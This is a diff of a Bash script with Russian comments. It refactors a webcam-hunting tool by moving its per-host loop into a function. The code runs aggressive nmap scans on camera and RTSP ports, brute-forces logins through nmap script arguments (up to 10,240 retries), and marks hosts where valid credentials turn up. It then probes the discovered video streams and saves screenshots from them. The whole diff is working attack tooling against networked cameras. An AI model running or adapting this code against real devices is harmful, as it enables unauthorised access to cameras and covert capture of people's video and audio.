@@ -29,6 +29,49 @@ RTSPREGEX='rtsp:\/\/[0-9.]\+\/\S*'
 function f_echo_progress () { echo -n " $(bc -l <<< "scale=1; 100.0*($1-0.5)/$2")%" ; }
 function f_echo_subprogress () { echo -n '.' ; }
 #
+# Делает глубокое сканирование хоста: $1 - хост
+function f_deep_scan_host () {
+	rm -f "$STAGE3" "$STAGE4"
+	# 81,8008,8081 - Beward MJPG
+	nmap -vvv --privileged -T4 -n -PN -sS -sU -p T:80,T:81,T:8008,T:8080,T:8081,T:554,U:554 --reason \
+		--script "$SCRIPTS" --script-args "$SCRIPTS_ARGS" \
+		--host-timeout "$HOST_TIMELIMIT" "$1" -oN "$STAGE3" > /dev/null 2>&1
+	F=''
+	if grep -q 'Valid credentials' "$STAGE3" ; then F="${F}_creds" ; fi # Флаг: Найден логин-пароль
+	if grep -q 'No valid accounts found' "$STAGE3" ; then F="${F}_nocreds" ; fi # Флаг: Не найден логин-пароль
+	if grep -q 'Discovered URLs' "$STAGE3" ; then
+		F="${F}_rtsp" # Флаг: Есть рабочие стримы
+		echo ' ' >> "$STAGE4"
+		M=0
+		for item3 in `grep -o "$RTSPREGEX" "$STAGE3"` ; do
+			if [ "$M" -ge "$LIBAV_LIMIT" ] ; then
+				echo "Достигнут LIBAV_LIMIT ($LIBAV_LIMIT)!" >> "$STAGE4"
+				break
+			fi
+			f_echo_subprogress
+			timeout -k 5 15 avprobe "$item3" >> "$STAGE4" 2>&1
+			if [ "$LIBAV_SCREENSHOT" = 'true' ] ; then
+				SCREENFILE="${OUT}/${item2}_${M}.jpg"
+				timeout -k 5 15 avconv -i "$item3" -ss 3 -qscale 0 -t 1 -r 1 "$SCREENFILE" > /dev/null 2>&1
+				if [ -f "$SCREENFILE" ] ; then
+					chown "$U:$U" "$SCREENFILE"
+					echo "Скриншот '$item3' сохранен в '$SCREENFILE'." >> "$STAGE4"
+					echo ' ' >> "$STAGE4"
+				fi
+			fi
+			(( ++M ))
+		done
+		if grep -q 'Stream #[.0-9]*: Video' "$STAGE4" ; then F="${F}_video" ; fi # Флаг: Есть видео
+		if grep -q 'Stream #[.0-9]*: Audio' "$STAGE4" ; then F="${F}_audio" ; fi # Флаг: Есть звук
+		if grep -q 'Interleaved RTP mode is not supported yet' "$STAGE4" ; then F="${F}_tcp" ; fi # Флаг: TCP
+		cat "$STAGE4" >> "$STAGE3"
+	fi 
+	cat "$STAGE3" >> "${OUT}/all.txt" # ! Дозапись
+	INFOFILE="${OUT}/${item2}${F}_.txt"
+	cat "$STAGE3" >> "$INFOFILE" # ! Дозапись
+	chown "$U:$U" "$INFOFILE"
+}
+#
 OUT="${OUT:-$1-webcam}"
 mkdir -p "$OUT"
 TMP="${TMP:-$OUT/tmp}"
@@ -78,45 +121,7 @@ SCRIPTS_ARGS="$SCRIPTS_ARGS,brute.retries=10240,http-auth.path='/',http-form-bru
 I=1
 while IFS= read -r item2 || [[ -n "$item2" ]] ; do
 	f_echo_progress "$I" "$N"
-	rm -f "$STAGE3" "$STAGE4"
-	# 81,8008,8081 - Beward MJPG
-	nmap -vvv --privileged -T4 -n -PN -sS -sU -p T:80,T:81,T:8008,T:8080,T:8081,T:554,U:554 --reason \
-		--script "$SCRIPTS" --script-args "$SCRIPTS_ARGS" \
-		--host-timeout "$HOST_TIMELIMIT" "$item2" -oN "$STAGE3" > /dev/null 2>&1
-	F=''
-	if grep -q 'Valid credentials' "$STAGE3" ; then F="${F}_creds" ; fi # Флаг: Найден логин-пароль
-	if grep -q 'No valid accounts found' "$STAGE3" ; then F="${F}_nocreds" ; fi # Флаг: Не найден логин-пароль
-	if grep -q 'Discovered URLs' "$STAGE3" ; then
-		F="${F}_rtsp" # Флаг: Есть рабочие стримы
-		echo ' ' >> "$STAGE4"
-		M=0
-		for item3 in `grep -o "$RTSPREGEX" "$STAGE3"` ; do
-			if [ "$M" -ge "$LIBAV_LIMIT" ] ; then
-				echo "Достигнут LIBAV_LIMIT ($LIBAV_LIMIT)!" >> "$STAGE4"
-				break
-			fi
-			f_echo_subprogress
-			timeout -k 5 15 avprobe "$item3" >> "$STAGE4" 2>&1
-			if [ "$LIBAV_SCREENSHOT" = 'true' ] ; then
-				SCREENFILE="${OUT}/${item2}_${M}.jpg"
-				timeout -k 5 15 avconv -i "$item3" -ss 3 -qscale 0 -t 1 -r 1 "$SCREENFILE" > /dev/null 2>&1
-				if [ -f "$SCREENFILE" ] ; then
-					chown "$U:$U" "$SCREENFILE"
-					echo "Скриншот '$item3' сохранен в '$SCREENFILE'." >> "$STAGE4"
-					echo ' ' >> "$STAGE4"
-				fi
-			fi
-			(( ++M ))
-		done
-		if grep -q 'Stream #[.0-9]*: Video' "$STAGE4" ; then F="${F}_video" ; fi # Флаг: Есть видео
-		if grep -q 'Stream #[.0-9]*: Audio' "$STAGE4" ; then F="${F}_audio" ; fi # Флаг: Есть звук
-		if grep -q 'Interleaved RTP mode is not supported yet' "$STAGE4" ; then F="${F}_tcp" ; fi # Флаг: TCP
-		cat "$STAGE4" >> "$STAGE3"
-	fi 
-	cat "$STAGE3" >> "${OUT}/all.txt" # ! Дозапись
-	INFOFILE="${OUT}/${item2}${F}_.txt"
-	cat "$STAGE3" >> "$INFOFILE" # ! Дозапись
-	chown "$U:$U" "$INFOFILE"
+	f_deep_scan_host "$item2"
 	(( ++I ))
 done < "$DISCOVERED2"
 echo " "
